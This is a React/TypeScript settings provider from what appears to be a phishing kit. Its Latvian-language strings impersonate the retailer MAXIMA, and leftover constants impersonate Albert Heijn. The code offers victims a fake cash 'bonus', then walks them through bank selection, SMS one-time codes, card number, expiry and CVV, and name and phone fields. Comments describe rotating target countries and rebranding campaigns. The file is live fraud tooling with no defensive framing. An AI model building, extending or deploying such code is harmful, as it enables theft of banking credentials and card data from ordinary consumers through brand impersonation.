"use client";

import { createContext, useContext, useEffect, useState, ReactNode, useMemo, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { normalizeCountryName } from "@/lib/country-utils";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import { brandifySettings, getCampaignNameFromSettings } from "@/lib/brand";
import { applyBrandTheme, getThemePrimary } from "@/lib/theme";

export type GlobalSettings = {
  logo_url: string;
  bg_url: string;
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
  site_language: string;
  target_country?: string;

  wheel_settings: any;
};

type LegacyGlobalSettings = Partial<GlobalSettings> & {
  background_url?: string;
};

const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
const ALBERT_HEIJN_LOGO_URL = "/form-assets/maxima-logo.png";
const PORTAL_BG_URL = "/form-assets/bg-desktop.png";
const LEGACY_BG_URL = "/spar-bg.webp";
const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
const LEGACY_WIN_SUBTITLE =
  "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";

function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
  const next = { ...settings };

  if (!next.bg_url && next.background_url) {
    next.bg_url = next.background_url;
  }

  if (
    !next.logo_url ||
    next.logo_url === "/logo.webp" ||
    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
  ) {
    next.logo_url = "/form-assets/maxima-logo.png";
  }

  // Eski .png/.jpg uzantili lokal yollar artik .webp (tum gorseller webp'e donusturuldu)
  if (/^\/[^?#]+\.(png|jpe?g|gif)$/i.test(next.logo_url)) {
    next.logo_url = next.logo_url.replace(/\.(png|jpe?g|gif)$/i, ".webp");
  }

  if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
    next.bg_url = PORTAL_BG_URL;
  }

  if (/^\/[^?#]+\.(png|jpe?g|gif)$/i.test(next.bg_url)) {
    next.bg_url = next.bg_url.replace(/\.(png|jpe?g|gif)$/i, ".webp");
  }

  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
    next.portal_name = "MAXIMA klientu portāls";
  }

  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
    next.support_center_name = "MAXIMA atbalsta centrs";
  }

  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
    next.win_title = "Ekskluzīva MAXIMA prēmija";
  }

  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
    next.win_subtitle =
      "Apsveicam! Jūs esat izvēlēts šodienas MAXIMA kampaņai. Noklikšķiniet uz pogas zemāk, lai saņemtu savu līdz 2 500 eiro prēmiju.";
  }

  if (!next.target_country || next.target_country === "Hollanda" || next.target_country === "Estonya" || next.target_country === "Litvanya") {
    next.target_country = "Letonya";
  }

  if (next.target_country) {
    next.target_country = normalizeCountryName(next.target_country);
  }

  if (!next.site_language || next.site_language === "nl" || next.site_language === "et" || next.site_language === "lt") {
    next.site_language = "lv";
  }

  return next;
}

export const defaultSettings: GlobalSettings = {
  logo_url: "/form-assets/maxima-logo.png",
  bg_url: PORTAL_BG_URL,
  portal_name: "MAXIMA klientu portāls",
  support_center_name: "MAXIMA atbalsta centrs",
  win_title: "Ekskluzīva MAXIMA prēmija",
  win_subtitle:
    "Apsveicam! Jūs esat izvēlēts šodienas MAXIMA kampaņai. Noklikšķiniet uz pogas zemāk, lai saņemtu savu 5000 eiro prēmiju.",
  win_button: "Saņemt prēmiju",
  banken_title: "Izvēlieties savu banku",
  banken_subtitle: "Izvēlieties savu banku, lai turpinātu.",
  banken_search_placeholder: "Meklēt banku...",
  wait_title: "Lūdzu, uzgaidiet",
  wait_subtitle: "Jūsu pieprasījums tiek droši apstrādāts...",
  sms_title: "SMS drošības kods",
  sms_subtitle: "Ievadiet {digits} ciparu kodu.",
  sms_input_label: "Vienreizējs kods",
  sms_button: "Apstiprināt",
  sms_loading: "Apstrādājas...",
  card_title: "Maksājuma informācija",
  card_subtitle: "Pārbaudiet un apstipriniet savus datus.",
  card_owner_label: "Kartes īpašnieka vārds",
  card_number_label: "Kartes numurs",
  card_expiry_label: "Derīguma termiņš MM/GG",
  card_cvv_label: "Drošības kods",
  card_button: "Turpināt",
  code_title: "Laipni lūdzam",
  code_subtitle: "Ievadiet dalības kodu, ko saņēmāt no partnera {partner}, lai saņemtu apbalvojumu.",
  code_button: "Apstiprināt kodu",
  live_support_title: "Tiešais atbalsts",
  live_support_subtitle:
    "Lai turpinātu, jums jāsazinās ar mūsu klientu apkalpošanas nodaļu.\n\nNoklikšķiniet uz pogas zemāk, lai sāktu sarunu.",
  live_support_button: "Sākt sarunu",
  profile_title_small: "Balvas apstiprinājums",
  profile_title_main: "Jūsu prēmijas summa",
  profile_subtitle: "Apstipriniet savus datus turpmākai apstrādei.",
  profile_firstname_label: "Vārds",
  profile_lastname_label: "Uzvārds",
  profile_phone_label: "Mobilā tālruņa numurs",
  profile_button: "Tālāk",
  profile_loading_text: "Apstrādājas...",
  site_language: "lv",
  target_country: "Letonya",
  wheel_settings: {},
};

const SettingsContext = createContext<{ settings: GlobalSettings; loading: boolean }>({
  settings: defaultSettings,
  loading: false,
});

export function SettingsProvider({ children }: { children: ReactNode }) {
  const [settings, setSettings] = useState<GlobalSettings>(defaultSettings);
  const [loading, setLoading] = useState(true);
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const bgSignatureRef = useRef("");

  useEffect(() => {
    async function loadSettings() {
      if (!supabase) {
        setLoading(false);
        return;
      }
      const { data, error } = await supabase
        .from("global_settings")
        .select("*")
        .limit(1)
        .maybeSingle();

      if (data && !error) {
        setSettings((prev) => {
          const normalized = normalizeBranding({ ...prev, ...data }) as GlobalSettings;
          // Kampanya adi (wheel_settings.campaign_name): tum metinlerdeki "IKI"
          // ibaresi runtime'da kampanya ismiyle degistirilir.
          return brandifySettings(
            normalized as unknown as Record<string, unknown>,
            getCampaignNameFromSettings(normalized),
          ) as unknown as GlobalSettings;
        });
      }
      setLoading(false);
    }
    
    void loadSettings();
  }, [supabase]);

  // Kampanya tema rengi (wheel_settings.theme_primary) -> CSS degiskenleri
  useEffect(() => {
    applyBrandTheme(getThemePrimary(settings));
  }, [settings]);

  // Apply custom background image dynamically to the body
  useEffect(() => {
    let frameId = 0;

    const updateBg = () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }

      frameId = window.requestAnimationFrame(() => {
        frameId = 0;

      const isMobile = window.innerWidth <= 768;
      const targetWidth = Math.min(
        Math.round(window.innerWidth * Math.max(window.devicePixelRatio || 1, 1)),
        isMobile ? 900 : 1600,
      );
      
      let activeBg: string | "" = isMobile && settings.wheel_settings?.bg_url_mobile 
        ? settings.wheel_settings.bg_url_mobile 
        : settings.bg_url;
        
      const pageBgs = settings.wheel_settings?.page_backgrounds || {};
      const path = window.location.pathname;
      const isWheelPage = /^\/wheel(\/|$|\?)/.test(path) || path.startsWith("/wheel");

      if (path.includes('/code') && pageBgs.code) activeBg = pageBgs.code;
      else if (isWheelPage && pageBgs.wheel) activeBg = pageBgs.wheel;
      // Wheel page: explicitly NO portal background by default (transparent — only wheel's own container background visible)
      else if (isWheelPage) activeBg = "";
      else if (path.includes('/win') && pageBgs.win) activeBg = pageBgs.win;
      else if (path.includes('/form') && pageBgs.form) activeBg = pageBgs.form;
      else if (path.includes('/banken') && pageBgs.banken) activeBg = pageBgs.banken;
      else if (path.includes('/sms') && pageBgs.sms) activeBg = pageBgs.sms;
      else if (path.includes('/card') && pageBgs.card) activeBg = pageBgs.card;

      const nextSignatureNoBg = `${window.location.pathname}|no-bg`;
      if (!activeBg) {
        if (bgSignatureRef.current !== nextSignatureNoBg) {
          bgSignatureRef.current = nextSignatureNoBg;
          document.documentElement.style.setProperty('--custom-bg', 'none');
        }
        return;
      }

      const optimizedBg = optimizeSupabaseImageUrl(activeBg, {
        width: targetWidth,
        quality: isMobile ? 60 : 68,
        format: "webp",
      });
      const nextSignature = `${window.location.pathname}|${optimizedBg}`;
      if (bgSignatureRef.current === nextSignature) {
        return;
      }

      bgSignatureRef.current = nextSignature;
      document.documentElement.style.setProperty('--custom-bg', `url("${optimizedBg}")`);
      });
    };

    updateBg();
    window.addEventListener('resize', updateBg);
    window.addEventListener('orientationchange', updateBg);
    return () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }
      window.removeEventListener('resize', updateBg);
      window.removeEventListener('orientationchange', updateBg);
    };
  }, [settings.bg_url, settings.wheel_settings, loading]);

  return (
    <SettingsContext.Provider value={{ settings, loading }}>
      {children}
    </SettingsContext.Provider>
  );
}

export function useSettings() {
  return useContext(SettingsContext);
}
